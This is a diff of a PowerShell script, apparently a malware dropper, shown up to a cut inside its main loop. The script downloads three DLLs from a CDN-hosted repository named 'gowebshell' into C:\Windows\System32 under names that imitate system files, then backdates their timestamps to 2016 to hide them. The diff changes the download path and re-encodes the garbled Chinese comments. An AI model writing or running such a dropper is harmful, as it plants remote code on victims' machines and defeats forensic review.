@@ -1,26 +1,26 @@
-# ¶¨ÒåÒªÏÂÔØµÄÎÄ¼şÁĞ±í
+# å®šä¹‰è¦ä¸‹è½½çš„æ–‡ä»¶åˆ—è¡¨
 $fileList = @(
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/x64.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/x64.dll"
         OutputPath = "C:\Windows\system32\mscorst64.dll"
         CreationTime = Get-Date "2016-07-16 21:18:00"
         ModificationTime = Get-Date "2016-07-16 21:18:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/x32.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/x32.dll"
         OutputPath = "C:\Windows\system32\mscorst.dll"
         CreationTime = Get-Date "2016-07-17 10:30:00"
         ModificationTime = Get-Date "2016-07-17 10:30:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/infocard.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/infocard.dll"
         OutputPath = "C:\Windows\System32\infocard.dll"
         CreationTime = Get-Date "2016-07-18 14:45:00"
         ModificationTime = Get-Date "2016-07-18 14:45:00"
     }
 )
 
-# ÏÂÔØ²¢ÉèÖÃÎÄ¼şµÄ´´½¨Ê±¼äºÍĞŞ¸ÄÊ±¼ä
+# ä¸‹è½½å¹¶è®¾ç½®æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´å’Œä¿®æ”¹æ—¶é—´
 foreach ($fileInfo in $fileList) {
     Invoke-WebRequest -Uri $fileInfo.Url -OutFile $fileInfo.OutputPath
     Set-ItemProperty -Path $fileInfo.OutputPath -Name CreationTime -Value $fileInfo.CreationTime
